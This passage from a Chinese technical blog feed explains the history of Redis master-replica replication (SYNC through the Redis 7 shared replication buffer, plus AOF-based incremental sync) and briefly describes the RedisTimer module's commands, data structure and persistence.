title="3.2、思考"></a>3.2、思考</h3><ul><li>罗列了一些关于这种数据模型的适用场景：<ul><li>体检健康指标判断：体检健康指标的参数通常可用于分析多种疾病的可能性，而这种医学上的健康指标通常是固定可分析的，因此可用于健康指标的推测与分析；</li><li>经纬度国家&#x2F;地区筛选：国家&#x2F;地区的地理位置信息基本也是固定不变的，通常可以用于筛选某个经纬度下的国家与地区信息；</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> RedisModule </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisModule </tag>
            
            <tag> RedisIntervalSet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis主从复制演进史与奇思妙想</title>
      <link href="/2022/10/01/redis-replication/"/>
      <url>/2022/10/01/redis-replication/</url>
      
        <content type="html"><![CDATA[<p>Redis 的主从复制模型从 Redis2.8 版本到 Redis7.0 经历了很多大的优化与改造，从最初版本的全量数据同步，到后续的 PSYNC 的增量数据同步，无盘数据传输方案，PSYNC2 的同源数据同步方案，无盘数据加载方案到当前的最新版本中的共享复制缓冲区的方案。同时社区中也诞生了一些奇妙的解决方案，例如基于AOF文件的增量同步等。这篇文章主要借鉴于 <a href="https://mp.weixin.qq.com/s/V31m7Vcw6EzcghF9N9aWyQ">Redis 主从复制演进历程与百度实践</a> ，同时按照自己的理解绘制了一些示意图。</p><h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>目前 Redis 支持两种主从数据同步方式：全量同步和增量同步。</p><h1 id="二、Redis主从复制演进史"><a href="#二、Redis主从复制演进史" class="headerlink" title="二、Redis主从复制演进史"></a>二、Redis主从复制演进史</h1><h2 id="2-1、SYNC方案"><a href="#2-1、SYNC方案" class="headerlink" title="2.1、SYNC方案"></a>2.1、SYNC方案</h2><ul><li><p>版本范围：1.3.6 ～ 2.6.17 （以下分析基于 2.6.17 版本）</p></li><li><p>方案特点：</p><ul><li>支持全量数据同步；</li></ul></li><li><p>持久化及传输流程：</p><ul><li>调用 fork 生成子进程，并在子进程中将内存中的数据持久化到 rdb 文件中；</li><li>获取所有状态为 WAIT_BGSAVE_END 的从库，为其注册发送 rdb 数据的事件；</li><li>发送 rdb 数据完成后，将发送堆积的增量数据给从库；</li></ul></li><li><p>交互流程：</p><ul><li>主库：<ul><li>接收从库的建连请求；</li><li>处理从库发送的探测消息，并依次按需给从库返回 pong &#x2F; ok &#x2F; ok 消息；</li><li>处理从库发送的 sync 命令，使用 fork 的方式持久化 rdb 数据，之后在主线程中注册一个读写事件将其数据发送给从库；</li></ul></li><li>从库：<ul><li>外部对从库执行 slaveof master_ip master_port 操作，从库主动与主库建立连接；</li><li>从库依次按需发送 ping &#x2F; auth &#x2F; replconf listening-port $port 消息给主库，并接受主库回复；</li><li>从库给主库发送 sync 命令，准备接收主库的 rdb 消息内容，并在接收完成后加载数据；</li></ul></li></ul></li></ul><p><img src="/assets/images/redis-replication-sync-talk.png" alt="SYNC方案的交互流程" loading="lazy"></p><ul><li>复制状态机：<ul><li>主库（slave-&gt;replstate）：<ul><li>REDIS_REPL_NONE ： 创建从库客户端的初始状态；</li><li>REDIS_REPL_WAIT_BGSAVE_START ： 当前存在正在执行 bgsave 的任务，需要等待下一次的 bgsave 的标记状态；</li><li>REDIS_REPL_WAIT_BGSAVE_END ： 对应客户端正在等待 bgsave 完成的标记状态；</li><li>REDIS_REPL_SEND_BULK ： 正在给对应的客户端发送 rdb 数据的状态；</li><li>REDIS_REPL_ONLINE ： 发送完成 rdb 数据后状态；</li></ul></li><li>从库（server.repl_state）：<ul><li>REDIS_REPL_NONE ： 初始状态；</li><li>REDIS_REPL_CONNECT ： 从库执行 slaveof 之后的状态；</li><li>REDIS_REPL_CONNECTING ： 从库连接主库之后的状态；</li><li>REDIS_REPL_RECEIVE_PONG ： 从库向主库发送 ping 之后等待接收 pong 时的状态；</li><li>REDIS_REPL_TRANSFER ： 从库开始接收 rdb 数据的状态；</li><li>REDIS_REPL_CONNECTED ： 从库接收 rdb 并加载数据完成的状态；</li></ul></li></ul></li></ul><p><img src="/assets/images/redis-replication-sync-state.png" alt="SYNC方案的复制状态机" loading="lazy"></p><h2 id="2-2、PSYNC方案"><a href="#2-2、PSYNC方案" class="headerlink" title="2.2、PSYNC方案"></a>2.2、PSYNC方案</h2><ul><li><p>版本范围：2.8.0 ～ 2.8.17 （以下分析基于 2.8.17 版本）</p></li><li><p>方案特点：</p><ul><li>引入 repl_backlog 的概念，用于在主库上保存一部分写入历史，作为后续从库增量同步的数据源； </li><li>引入 psync_runid 和 psync_offset 的概念，用于支持从库发起增量同步，并且用于主库进行增量同步的验证；</li></ul></li><li><p>持久化及传输流程：</p><ul><li>主库调用 fork 生成子进程，并在子进程中将内存中的数据持久化到 rdb 文件中；</li><li>主库获取所有状态为 WAIT_BGSAVE_END 的从库，为其注册发送 rdb 数据的事件；</li><li>主库发送 rdb 数据完成后，将发送堆积的增量数据给从库；</li></ul></li><li><p>交互流程：</p><ul><li><p>主库：</p><ul><li>接收从库的建连请求；</li><li>处理从库发送的探测消息，并依次按需给从库回复消息；</li><li>处理从库发送的 psync runid offset 或 sync 命令，校验 runid 和 offset ，之后主库给从库回复标识以及对应数据，其中标识为：<ul><li>全量同步标识 ：<code>+FULLRESYNC runid offset</code> ；</li><li>增量同步标识 ： <code>+CONTINUE</code> ；</li></ul></li></ul></li><li><p>从库：</p><ul><li><p>外部对从库执行 slaveof master_ip master_port 操作，从库主动与主库建立连接；</p></li><li><p>从库向主库发送 ping 命令，并接收回复消息；</p></li><li><p>从库按需向主库发送 auth 命令，并接收回复消息；</p></li><li><p>从库向主库发送 replconf listening-port $port 消息，并接收回复消息；</p></li><li><p>从库按需向主库发送 replconf ip-address $ip 消息，并接收回复消息；</p></li><li><p>从库向主库发送 replconf capa eof 消息，并接收回复消息；</p></li><li><p>从库向主库发送 psync runid offset 或者 sync 消息，并接收回复消息，从库之后进入全量或增量数据同步；</p></li></ul></li></ul></li></ul><p><img src="/assets/images/redis-replication-psync-talk.png" alt="PSYNC方案的交互流程" loading="lazy"></p><ul><li><p>复制状态机：</p><ul><li><p>主库（slave-&gt;replstate）：</p><ul><li>REPL_STATE_NONE ： 创建从库客户端后的初始状态；</li><li>SLAVE_STATE_WAIT_BGSAVE_START ： 等待开始生成一个 rdb 数据文件；</li><li>SLAVE_STATE_WAIT_BGSAVE_END ： 等待生成一个 rdb 数据文件完成；</li><li>SLAVE_STATE_SEND_BULK ：  正在给对应的客户端发送 rdb 数据的状态；</li><li>SLAVE_STATE_ONLINE ： 发送完成 rdb 数据后状态；</li></ul></li><li><p>从库（server.repl_state）：</p><ul><li>REPL_STATE_NONE ： 初始状态；</li><li>REPL_STATE_CONNECT ： 从库执行 slaveof 之后的状态；</li><li>REPL_STATE_CONNECTING ： 从库连接主库之后的状态；</li><li>REPL_STATE_RECEIVE_PONG ：  从库向主库发送 ping 之后等待接收 pong 时的状态；</li><li>REPL_STATE_SEND_AUTH ：  从库接下来按需向主库发送 auth 消息；</li><li>REPL_STATE_RECEIVE_AUTH ： 从库向主库发送 auth 之后等待接收返回消息时的状态；</li><li>REPL_STATE_SEND_PORT ： 从库接下来要向主库发送 replconf listening-port $port  消息；</li><li>REPL_STATE_RECEIVE_PORT ： 从库向主库发送 replconf listening-port $port 之后等待接收返回消息时的状态；</li><li>REPL_STATE_SEND_IP ： 从库接下来按需向主库发送 replconf ip-address $ip 消息；</li><li>REPL_STATE_RECEIVE_IP ： 从库向主库发送 replconf ip-address $ip 之后等待接收返回消息时的状态；</li><li>REPL_STATE_SEND_CAPA ：  从库接下来要向主库发送 replconf capa eof  消息；</li><li>REPL_STATE_RECEIVE_CAPA ： 从库向主库发送 replconf capa eof 之后等待接收返回消息时的状态；</li><li>REPL_STATE_SEND_PSYNC ： 从库接下来要向主库发送 psync runid offset 或者 sync 消息</li><li>REPL_STATE_RECEIVE_PSYNC ： 从库向主库发送 psync &#x2F; sync 之后等待接收返回消息时的状态；</li><li>REPL_STATE_TRANSFER ： 从库开始等待接收全量（rdb）的数据；</li><li>REPL_STATE_CONNECTED ： 从库开始等待接收增量的数据；</li></ul></li></ul></li></ul><p><img src="/assets/images/redis-replication-psync-state.png" alt="PSYNC方案的复制状态机" loading="lazy"></p><h2 id="2-3、无盘传输方案"><a href="#2-3、无盘传输方案" class="headerlink" title="2.3、无盘传输方案"></a>2.3、无盘传输方案</h2><ul><li><p>版本范围：2.8.18 ～ 3.2.13 （以下分析基于 3.2.13 版本）</p></li><li><p>方案特点：</p><ul><li>主库无需将 rdb 数据持久化就可以将数据传输给从库（引入 repl-diskless-sync 开关控制）；</li><li>支持同时给多个从库传输 rdb 数据；</li></ul></li><li><p>持久化及传输流程（仅介绍无盘传输）：</p><ul><li><p>主库获取所有状态为 WAIT_BGSAVE_START 的从库列表，记录对应的 fd 信息；</p></li><li><p>主库调用 fork 生成子进程，并在子进程中将持久化的数据写给对应的 fds ，传输 rdb 前发送标记信息为 <code>&quot;$EOF: $eofmask</code> ，传输 rdb 后发送标记信息为 <code>$eofmark</code>  （其中 $eofmask 为 40 位的随机数）；</p></li><li><p>主库的子进程传输数据完成后，通过管道的方式告知父进程相关从库的数据同步状态；</p></li><li><p>主库的父进程后续将发送堆积的增量数据给从库；</p></li></ul></li><li><p>交互流程：与 2.2 PSYNC 方案完全一致；</p></li><li><p>复制状态机：与 2.2 PSYNC 方案完全一致；</p></li></ul><h2 id="2-4、PSYNC2方案"><a href="#2-4、PSYNC2方案" class="headerlink" title="2.4、PSYNC2方案"></a>2.4、PSYNC2方案</h2><ul><li><p>版本范围：4.0 ～ 5.0.14（以下分析基于 5.0.14 版本）</p></li><li><p>方案特点：</p><ul><li>支持同源增量数据同步，解决了切主之后，从库与新主库之间需要进行全量同步的问题；</li></ul></li><li><p>持久化及传输流程（仅考虑有盘传输）：</p><ul><li>主库调用 fork 生成子进程，并在子进程中将内存中的数据持久化到 rdb 文件中；</li><li>主库获取所有状态为 WAIT_BGSAVE_END 的从库，为其注册发送 rdb 数据的事件；</li><li>主库发送 rdb 数据完成后，将发送堆积的增量数据给从库；</li></ul></li><li><p>交互流程：</p><ul><li><p>主库：</p><ul><li>接收从库的建连请求；</li><li>处理从库发送的探测消息，并依次按需给从库回复消息；</li><li>处理从库发送的 psync replid offset 或 sync 命令，校验 replid 和 offset ，之后主库给从库回复标识以及对应数据，其中标识为：<ul><li>全量同步标识 ：<code>+FULLRESYNC replid offset</code>  ；</li><li>增量同步标识 ： <code>+CONTINUE</code> 或者 <code>+CONTINUE replid</code> ；</li></ul></li></ul></li><li><p>从库：</p><ul><li><p>外部对从库执行 slaveof master_ip master_port 操作，从库主动与主库建立连接；</p></li><li><p>从库向主库发送 ping 命令，并接收回复消息；</p></li><li><p>从库按需向主库发送 auth 命令，并接收回复消息；</p></li><li><p>从库向主库发送 replconf listening-port $port 消息，并接收回复消息；</p></li><li><p>从库按需向主库发送 replconf ip-address $ip 消息，并接收回复消息；</p></li><li><p>从库向主库发送 replconf capa eof capa psync2 消息，并接收回复消息；</p></li><li><p>从库向主库发送 psync replid offset 或者 sync 消息，并接收回复消息，从库之后进入全量或增量数据同步；</p></li></ul></li></ul></li></ul><p><img src="/assets/images/redis-replication-psync2-talk.png" alt="PSYNC2方案的交互流程" loading="lazy"></p><ul><li><p>复制状态机：</p><ul><li><p>主库（slave-&gt;replstate）：</p><ul><li>REPL_STATE_NONE ： 创建从库客户端后的初始状态；</li><li>SLAVE_STATE_WAIT_BGSAVE_START ： 等待开始生成一个 rdb 数据文件；</li><li>SLAVE_STATE_WAIT_BGSAVE_END ： 等待生成一个 rdb 数据文件完成；</li><li>SLAVE_STATE_SEND_BULK ：  正在给对应的客户端发送 rdb 数据的状态；</li><li>SLAVE_STATE_ONLINE ： 发送完成 rdb 数据后状态；</li></ul></li><li><p>从库（server.repl_state）：</p><ul><li>REPL_STATE_NONE ： 初始状态；</li><li>REPL_STATE_CONNECT ： 从库执行 slaveof 之后的状态；</li><li>REPL_STATE_CONNECTING ： 从库连接主库之后的状态；</li><li>REPL_STATE_RECEIVE_PONG ：  从库向主库发送 ping 之后等待接收 pong 时的状态；</li><li>REPL_STATE_SEND_AUTH ：  从库接下来按需向主库发送 auth 消息；</li><li>REPL_STATE_RECEIVE_AUTH ： 从库向主库发送 auth 之后等待接收返回消息时的状态；</li><li>REPL_STATE_SEND_PORT ： 从库接下来要向主库发送 replconf listening-port $port  消息；</li><li>REPL_STATE_RECEIVE_PORT ： 从库向主库发送 replconf listening-port $port 之后等待接收返回消息时的状态；</li><li>REPL_STATE_SEND_IP ： 从库接下来按需向主库发送 replconf ip-address $ip 消息；</li><li>REPL_STATE_RECEIVE_IP ： 从库向主库发送 replconf ip-address $ip 之后等待接收返回消息时的状态；</li><li>REPL_STATE_SEND_CAPA ：  从库接下来要向主库发送 replconf capa eof capa psync2  消息；</li><li>REPL_STATE_RECEIVE_CAPA ： 从库向主库发送 replconf capa eof capa psync2 之后等待接收返回消息时的状态；</li><li>REPL_STATE_SEND_PSYNC ： 从库接下来要向主库发送 psync replid offset 或者 sync 消息；</li><li>REPL_STATE_RECEIVE_PSYNC ： 从库向主库发送 psync &#x2F; sync 之后等待接收返回消息时的状态；</li><li>REPL_STATE_TRANSFER ： 从库开始等待接收全量（rdb）的数据；</li><li>REPL_STATE_CONNECTED ： 从库开始等待接收增量的数据；</li></ul></li></ul></li></ul><p><img src="/assets/images/redis-replication-psync2-state.png" alt="PSYNC2方案的复制状态机" loading="lazy"></p><h3 id="2-4-1、同源增量同步详解"><a href="#2-4-1、同源增量同步详解" class="headerlink" title="2.4.1、同源增量同步详解"></a>2.4.1、同源增量同步详解</h3><ul><li>关键变量：<ul><li>server.replid ： 当前实例对应主库的 replid ，如果当前实例为主库则为其自身的 replid ，该信息会在主从同步交互的流程中同步给从库，该信息会被持久化到 rdb 文件中；</li><li>server.replid2 ： 当前实例记录的前一个主库的 replid ；</li><li>server.second_replid_offset ： 与 server.replid2 对应，记录的是前一个主库对应的复制 offset 值，用于主库校验从库发起的增量同步请求是否合法；</li><li>server.cached_master ：用于记录当前连接的主库信息，用于记录下一次发起增量同步时所需要的信息；</li></ul></li><li>主从复制 ID 变更流程：<ul><li>从库 &#x3D;&gt; 主库 ： replid 为自己生成新的，replid2 为老主库的 replid ；</li><li>主库 &#x3D;&gt; 从库 ： replid 为新主库的 replid ，replid2 清空；</li><li>从库 &#x3D;&gt; 从库（变更主库） ： replid 为新主库的 replid ，replid2 清空；</li></ul></li></ul><p><img src="/assets/images/redis-replication-psync2-cognate.png" alt="PSYNC2同源增量同步中复制 ID 变更图解" loading="lazy"></p><p><img src="/assets/images/redis-replication-psync2-offset.png" alt="主从复制偏移校验流程" loading="lazy"></p><h2 id="2-5、无盘加载方案"><a href="#2-5、无盘加载方案" class="headerlink" title="2.5、无盘加载方案"></a>2.5、无盘加载方案</h2><ul><li><p>版本范围：6.0.0 ～ 6.2.6（以下分析基于 6.2.6 版本）</p></li><li><p>方案特点：</p><ul><li>从库支持了无盘加载 rdb 数据，即无需将 rdb 存储到本地后就可以将其数据加载到内存中；</li><li>从库支持在加载 rdb 数据时使用临时 db 备份之前内存的数据，避免加载的 rdb 数据异常；</li></ul></li><li><p>无盘加载启用条件（满足其一即可）：</p><ul><li>加载数据前要求备份原始数据（REPL_DISKLESS_LOAD_SWAPDB）；</li><li>本地无任何数据的情况（REPL_DISKLESS_LOAD_WHEN_DB_EMPTY）；</li></ul></li><li><p>数据加载流程（仅考虑无盘加载）：</p><ul><li>从库注册一个读事件 readSyncBulkPayload ，用于从主库接收 rdb 数据；</li><li>从库根据设定的加载的条件，按需备份本地的 DB 数据；</li><li>从库不断的从与主库的连接 socket 中读取传输的 rdb 数据，并解析后加载到本地 DB 中；</li><li>从库根据配置的清理 DB 的策略，异步或同步的清空备份的 DB 数据，完成数据加载；</li></ul></li><li><p>交互流程：与 PSYNC2 方案的交互流程完全一致；</p></li><li><p>复制状态机：与 PSYNC2 方案的复制状态机完全一致；</p></li></ul><h2 id="2-6、共享复制缓冲区"><a href="#2-6、共享复制缓冲区" class="headerlink" title="2.6、共享复制缓冲区"></a>2.6、共享复制缓冲区</h2><ul><li><p>版本范围： 7.0.0 ～ 7.0.5（该文章编写时 7.0.5 为最新版，以下分析基于 7.0.5 版本）</p></li><li><p>方案特点：</p><ul><li>创造性的将 Backlog 和从库连接的 OutputBuffer 合二为一，节省了多从库场景下的重复内存占用问题；</li></ul></li><li><p>数据结构设计：</p><ul><li>默认情况下每一个缓存区块（replBufBlock 节点）的最小 buffer 大小为 16K （PROTO_REPLY_CHUNK_BYTES）；</li><li>默认情况下每添加 64（REPL_BACKLOG_INDEX_PER_BLOCKS） 个缓存区块，就会记录一些快查索引节点；</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// server.repl_backlog 的类型变成了 replBacklog* 类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">replBacklog</span> &#123;</span><br>    listNode *ref_repl_buf_node;  <span class="hljs-comment">// 复制缓冲区块的引用节点</span><br>    <span class="hljs-type">size_t</span> unindexed_count;       <span class="hljs-comment">// 从上一次向 blocks_index 添加索引后增加的区块数量</span><br>    rax *blocks_index;            <span class="hljs-comment">// 用于快速查询的复制缓冲区块的索引集</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> histlen;            <span class="hljs-comment">// 积压缓冲区的实际大小</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> offset;             <span class="hljs-comment">// 复制积压缓冲区中记录的第一个有效字节的偏移值</span><br>&#125; replBacklog;<br><br><span class="hljs-comment">// ref_repl_buf_node 中的每一个节点的数据结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">replBufBlock</span> &#123;</span><br>    <span class="hljs-type">int</span> refcount;                 <span class="hljs-comment">// 使用该节点的引用计数</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> id;                 <span class="hljs-comment">// 复制缓冲区块的唯一编号，递增</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> repl_offset;        <span class="hljs-comment">// 该区块的第一有效字节数据对应的复制偏移值</span><br>    <span class="hljs-type">size_t</span> size, used;            <span class="hljs-comment">// 记录柔性数组对应内存块大小和使用的大小</span><br>    <span class="hljs-type">char</span> buf[];                   <span class="hljs-comment">// 柔性数组存储复制堆积数据</span><br>&#125; replBufBlock;<br><br><span class="hljs-comment">// 客户端连接的数据结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">client</span> &#123;</span><br>    ...<br>    listNode *ref_repl_buf_node;  <span class="hljs-comment">// 复制缓冲区块的引用节点</span><br>    <span class="hljs-type">size_t</span> ref_block_pos;         <span class="hljs-comment">// 下一个要发送的偏移量</span><br>    ...<br>&#125; client;<br></code></pre></td></tr></table></figure><p><img src="/assets/images/redis-replication-shared-repl-struct.png" alt="共享复制缓冲区数据结构图" loading="lazy"></p></li><li><p>复制状态机：</p><ul><li><p>主库（slave-&gt;replstate）：</p><ul><li>REPL_STATE_NONE ： 创建从库客户端后的初始状态；</li><li>SLAVE_STATE_WAIT_BGSAVE_START ： 等待开始生成一个 rdb 数据文件；</li><li>SLAVE_STATE_WAIT_BGSAVE_END ： 等待生成一个 rdb 数据文件完成；</li><li>SLAVE_STATE_SEND_BULK ：  正在给对应的客户端发送 rdb 数据的状态；</li><li>SLAVE_STATE_ONLINE ： 发送完成 rdb 数据后状态；</li></ul></li><li><p>从库（server.repl_state）：</p><ul><li>REPL_STATE_NONE ： 初始状态；</li><li>REPL_STATE_CONNECT ： 从库执行 slaveof 之后的状态；</li><li>REPL_STATE_CONNECTING ： 从库连接主库之后的状态；</li><li>REPL_STATE_RECEIVE_PING_REPLY ： 从库向主库发送 ping 之后等待接收 pong 时的状态；</li><li>REPL_STATE_SEND_HANDSHAKE ： 从库处于此状态时会依次向主库发送auth（按需）， replconf listening-port $port ， replconf ip-address $ip （按需）， replconf capa eof capa psync2 消息；</li><li>REPL_STATE_RECEIVE_AUTH_REPLY ： 从库按需从主库处接收 auth 消息的回复；；</li><li>REPL_STATE_RECEIVE_PORT_REPLY ： 从库从主库处接收 replconf listening-port $port 消息的回复；</li><li>REPL_STATE_RECEIVE_IP_REPLY ： 从库按需从主库处接收 replconf ip-address $ip 消息的回复；</li><li>REPL_STATE_RECEIVE_CAPA_REPLY ： 从库从主库处接收 replconf capa eof capa psync2 消息的回复；；</li><li>REPL_STATE_SEND_PSYNC ： 从库接下来要向主库发送 psync replid offset 或者 sync 消息；</li><li>REPL_STATE_RECEIVE_PSYNC_REPLY ：  从库向主库发送 psync &#x2F; sync 之后等待接收返回消息时的状态；</li><li>REPL_STATE_TRANSFER ：  从库开始等待接收全量（rdb）的数据；</li><li>REPL_STATE_CONNECTED ：  从库开始等待接收增量的数据；</li></ul></li></ul></li></ul><p><img src="/assets/images/redis-replication-shared-repl-state.png" alt="Redis7的复制状态机" loading="lazy"></p><h1 id="三、奇思妙想"><a href="#三、奇思妙想" class="headerlink" title="三、奇思妙想"></a>三、奇思妙想</h1><h2 id="3-1、AOF增量同步方案"><a href="#3-1、AOF增量同步方案" class="headerlink" title="3.1、AOF增量同步方案"></a>3.1、AOF增量同步方案</h2><p>我们知道 Redis 实现了基于 Backlog 的增量复制方案，但是考虑到线上实际的资源占用，Backlog 的内存大小通常不会设置的太大。如果 Redis 在写入量很大的情况下出现网络异常导致主从同步中断，从库重连时大概率会由于主库的 Backlog 被冲掉而导致无法进行增量同步的情况。在这种情况下，业界就出现了一些使用 AOF 来扩展 Backlog 数据范围的方案，从而形成了比较典型的基于 AOF 的增量同步方案。</p><ul><li>方案特点：<ul><li>基于 AOF 文件实现增量的数据同步，支持同步完成 AOF 文件后选择是否切换到 Backlog 的数据同步；</li></ul></li><li>持久化流程（AOF 数据持久化）：<ul><li>主库关闭重写 AOF 文件，限制单个 AOF 文件大小，允许 AOF 文件按照文件大小进行滚动拆分；</li><li>主库将与 Backlog 中完全一致的写操作以同步或者异步的方式持久化到 AOF 文件中；</li><li>主库保证 Backlog 中数据始终可以与最新 AOF 中的一段数据完全对应；</li></ul></li></ul><p><img src="/assets/images/redis-replication-psync-aof-data-relationship.png" alt="AOF磁盘数据与内存数据的映射关系" loading="lazy"></p><ul><li>增量同步流程：<ul><li>主库处理从库发起的 psync replid offset 增量同步请求，尝试寻找 offset 对应的数据所在的位置；<ul><li>如果 offset 可以在 Backlog 中找到，则可以直接从 Backlog 中进行增量数据同步【主线程直接发送数据】；</li><li>如果 offset 可以在 AOF 中找到，则可以直接从 AOF 中进行增量数据同步（发送数据文件）【单独线程发送数据】；</li></ul></li><li>增量数据同步延迟较小后，后续可以执行两种不同的策略：<ul><li>继续使用独立的线程不断的发送 AOF 中的数据；</li><li>切换到使用 Backlog 的方式发送后续的增量数据；</li></ul></li></ul></li></ul><p><img src="/assets/images/redis-replication-psync-aof-repl.png" alt="AOF增量同步流程" loading="lazy"></p><h2 id="3-2、社区的其他讨论"><a href="#3-2、社区的其他讨论" class="headerlink" title="3.2、社区的其他讨论"></a>3.2、社区的其他讨论</h2><ul><li><p>PSYNC3(PSYNC-AOF) 基于 AOF 实现复制：</p><ul><li><a href="https://github.com/redis/redis/issues/4357">https://github.com/redis/redis/issues/4357</a></li><li><a href="https://github.com/redis/redis/discussions/9282">https://github.com/redis/redis/discussions/9282</a></li></ul></li><li><p>SYNC-less replication 无全量同步的复制：</p><ul><li><a href="https://github.com/redis/redis/discussions/9278">https://github.com/redis/redis/discussions/9278</a></li></ul></li><li><p>Multiplex replication 多路复用复制：</p><ul><li><a href="https://github.com/redis/redis/pull/8440#issuecomment-771623319">RDB-bulk, PING, Replication-stream 多路复用传输</a></li></ul></li></ul><h1 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h1><ul><li><a href="https://mp.weixin.qq.com/s/V31m7Vcw6EzcghF9N9aWyQ">Redis 主从复制演进历程与百度实践</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg2NTcwNjU3MQ==&mid=2247483659&idx=1&sn=839380aef3faa3ac5a8bea05ed68e9aa&scene=21#wechat_redirect">Redis 7.0 共享复制缓冲区的设计与实现</a></li><li><a href="https://time.geekbang.org/qconplus/detail/100110470">百度 Redis 内核深度剖析（极客时间出品）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> 演进史 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisModule剖析 - RedisTimer</title>
      <link href="/2022/09/29/redismodule-redistimer/"/>
      <url>/2022/09/29/redismodule-redistimer/</url>
      
        <content type="html"><![CDATA[<p><code>RedisTimer</code> 是一款基于 Redis 的时间事件来实现的计时器的模块，通过时间事件机制来实现延迟&#x2F;循环执行对应的脚本（函数），由于该模块执行脚本（函数）的命令为 <code>FCALL</code>，因此要求Redis版本最低为7.0.0，该模块也支持数据的持久化，用于保证计时器的信息不丢失。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul><li>GitHub 地址：<a href="https://github.com/tzongw/redis-timer">https://github.com/tzongw/redis-timer</a></li></ul><h2 id="二、架构设计"><a href="#二、架构设计" class="headerlink" title="二、架构设计"></a>二、架构设计</h2><h3 id="2-1、相关命令"><a href="#2-1、相关命令" class="headerlink" title="2.1、相关命令"></a>2.1、相关命令</h3><ul><li>timer.new : 创建一个新的计时器，会在指定的时间之后执行对应的脚本（函数），会直接覆盖同名的已经存在的计时器；</li><li>timer.kill : 删除之前创建的计时器，并且删除对应的计时器key；</li><li>timer.info : 查看特定的计时器的信息；</li></ul><h3 id="2-2、数据结构"><a href="#2-2、数据结构" class="headerlink" title="2.2、数据结构"></a>2.2、数据结构</h3><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 计时器的数据结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">TimerData</span> &#123;<br>    RedisModuleString *key;        <span class="hljs-comment">// 对应计时器key对象</span><br>    RedisModuleString *function;   <span class="hljs-comment">// 需要执行的脚本</span><br>    <span class="hljs-type">mstime_t</span> interval;             <span class="hljs-comment">// 被调用的时间间隔，单位毫秒</span><br>    <span class="hljs-type">int</span> datalen;                   <span class="hljs-comment">// 脚本及其参数的数量</span><br>    <span class="hljs-type">int</span> numkeys;                   <span class="hljs-comment">// 参数中key的个数</span><br>    <span class="hljs-type">bool</span> loop;                     <span class="hljs-comment">// 是否循环执行，每次执行之后间隔 interval 后会再次执行</span><br>    <span class="hljs-type">bool</span> deleted;                  <span class="hljs-comment">// 计时器key是否已经从db中删除的标记</span><br>    RedisModuleTimerID tid;        <span class="hljs-comment">// 内部创建计时器时的id</span><br>    RedisModuleString *data[];     <span class="hljs-comment">// 脚本及其参数对象</span><br>&#125; TimerData;<br></code></pre></td></tr></table></figure><h3 id="2-3、持久化"><a href="#2-3、持久化" class="headerlink" title="2.3、持久化"></a>2.3、持久化</h3><h4 id="2-3-1、RDB的持久化"><a href="#2-3-1、RDB的持久化" class="headerlink" title="2.3.1、RDB的持久化"></a>2.3.1、RDB的持久化</h4><p>RDB 的存储过程比较简单，直接把对应结构体的所有信息持久化到 RDB 文件中，相关函数 <code>timer_RDBSaveCallBack</code> ；</p><h4 id="2-3-2、AOF的持久化"><a href="#2-3-2、AOF的持久化" class="headerlink" title="2.3.2、AOF的持久化"></a>2.3.2、AOF的持久化</h4><p>数据 AOF 的持久化会在 AofRewrite 的时候会用到，这里是将对应的数据结构转换为 <code>timer.new</code> 命令进行存储；</p><h3 id="2-4、其他细节"><a href="#2-4、其他细节" class="headerlink" title="2.4、其他细节"></a>2.4、其他细节</h3><ul><li>创建新的计时器时使用了 RedisModule 的 <code>RM_CreateTimer</code> 接口来注册了一个时间事件，从而实现在指定的时间之后执行对应的自定义的回调函数；</li><li>执行完成单次回调函数之后，依据 <code>loop</code> 字段判断是否需要循环执行，则选择是否再次增加一个时间事件，或者调用 <code>timer.kill</code> 删除计时器；</li><li>使用一个全局静态变量 <code>timers</code> 来记录当前现存的计时器数量，比便于在卸载该模块时进行判断；</li><li>计时器的脚本（函数）调用使用 <code>FCALL</code> 命令，因此对 Redis 版本有一些要求（最低版本<code>7.0.0</code>）；</li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
          <category> RedisModule </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> RedisModule </tag>
            
            <tag> RedisTimer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>译 - Gorilla: A Fast, Scalable, In-Memory Time Series Database</title>
      <link href="/2022/09/24/gorilla-cn/"/>
      <url>/2022/09/24/gorilla-cn/</url>
      
